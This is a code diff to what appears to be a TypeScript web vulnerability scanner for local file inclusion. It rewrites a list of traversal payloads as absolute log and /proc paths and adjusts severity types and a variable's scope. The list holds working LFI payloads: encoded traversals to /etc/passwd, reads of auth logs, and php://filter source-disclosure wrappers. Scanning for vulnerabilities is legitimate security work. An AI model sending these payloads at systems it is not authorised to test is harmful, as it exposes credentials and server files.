@@ -8,7 +8,7 @@ export interface LFIScanResult {
   vulnerabilities: Array<{
     payload: string;
     indicator: string;
-    severity: 'critical' | 'high' | 'medium' | 'catastrophic'; // Updated severity types
+    severity: 'critical' | 'high' | 'medium' | 'low' | 'catastrophic'; // Updated severity types
     type: string;
     evidence?: string;
     parameter?: string;
@@ -109,23 +109,23 @@ const LFI_PAYLOADS = [
   { payload: '../../../../../../../../../../../../etc/passwd', type: 'Deep Traversal (Extended)', severity: 'critical' as const, confidence: 0.98 },
   { payload: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', type: 'Triple URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
   { payload: '....//....//....//....//....//....//....//....//etc/passwd', type: 'Dot-Slash Bypass (Extended)', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '../../../../../../../var/log/auth.log', type: 'Auth Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '../../../../../../../var/log/secure', type: 'Secure Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '../../../../../../../var/log/mail.log', type: 'Mail Log Access', severity: 'medium' as const, confidence: 0.75 },
-  { payload: '../../../../../../../var/log/vsftpd.log', type: 'FTP Log Access', severity: 'medium' as const, confidence: 0.75 },
-  { payload: '../../../../../../../var/log/sshd.log', type: 'SSH Log Access', severity: 'high' as const, confidence: 0.85 },
-  { payload: '../../../../../../../var/log/lastlog', type: 'Lastlog Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '../../../../../../../var/log/wtmp', type: 'Wtmp Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '../../../../../../../var/log/faillog', type: 'Faillog Access', severity: 'medium' as const, confidence: 0.7 },
-  { payload: '../../../../../../../proc/version', type: 'Proc Version', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '../../../../../../../proc/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '../../../../../../../proc/mounts', type: 'Proc Mounts', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '../../../../../../../proc/config.gz', type: 'Proc Config', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '../../../../../../../proc/cpuinfo', type: 'Proc CPU Info', severity: 'medium' as const, confidence: 0.8 },
-  { payload: '../../../../../../../proc/self/fd/0', type: 'Proc FD 0', severity: 'low' as const, confidence: 0.6 },
-  { payload: '../../../../../../../proc/self/fd/1', type: 'Proc FD 1', severity: 'low' as const, confidence: 0.6 },
-  { payload: '../../../../../../../proc/self/fd/2', type: 'Proc FD 2', severity: 'low' as const, confidence: 0.6 },
-  { payload: '../../../../../../../proc/self/fd/3', type: 'Proc FD 3', severity: 'low' as const, confidence: 0.6 },
+  { payload: '/var/log/auth.log', type: 'Auth Log Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '/var/log/secure', type: 'Secure Log Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '/var/log/mail.log', type: 'Mail Log Access', severity: 'medium' as const, confidence: 0.75 },
+  { payload: '/var/log/vsftpd.log', type: 'FTP Log Access', severity: 'medium' as const, confidence: 0.75 },
+  { payload: '/var/log/sshd.log', type: 'SSH Log Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '/var/log/lastlog', type: 'Lastlog Access', severity: 'medium' as const, confidence: 0.7 },
+  { payload: '/var/log/wtmp', type: 'Wtmp Access', severity: 'medium' as const, confidence: 0.7 },
+  { payload: '/var/log/faillog', type: 'Faillog Access', severity: 'medium' as const, confidence: 0.7 },
+  { payload: '/proc/version', type: 'Proc Version', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/mounts', type: 'Proc Mounts', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/config.gz', type: 'Proc Config', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/cpuinfo', type: 'Proc CPU Info', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/self/fd/0', type: 'Proc FD 0', severity: 'low' as const, confidence: 0.6 },
+  { payload: '/proc/self/fd/1', type: 'Proc FD 1', severity: 'low' as const, confidence: 0.6 },
+  { payload: '/proc/self/fd/2', type: 'Proc FD 2', severity: 'low' as const, confidence: 0.6 },
+  { payload: '/proc/self/fd/3', type: 'Proc FD 3', severity: 'low' as const, confidence: 0.6 },
   { payload: 'php://filter/read=string.rot13/resource=index.php', type: 'PHP Filter (ROT13)', severity: 'critical' as const, confidence: 0.99 },
   { payload: 'php://filter/read=string.toupper/resource=index.php', type: 'PHP Filter (ToUpper)', severity: 'critical' as const, confidence: 0.99 },
   { payload: 'php://filter/read=string.tolower/resource=index.php', type: 'PHP Filter (ToLower)', severity: 'critical' as const, confidence: 0.99 },
@@ -213,6 +213,8 @@ export const performLFIScan = async (
     tested: true,
   };
 
+  let corsMetadata: CORSBypassMetadata | undefined; // Declare corsMetadata at a higher scope
+
   try {
     const url = normalizeUrl(target);
     const urlObj = new URL(url);
@@ -229,7 +231,6 @@ export const performLFIScan = async (
     // Get baseline
     let baselineLength = 0;
     let baselineStatus = 0;
-    let corsMetadata: CORSBypassMetadata | undefined;
     
     try {
       const baselineResult = await fetchWithBypass(url, { timeout: 10000, signal: requestManager?.scanController?.signal });
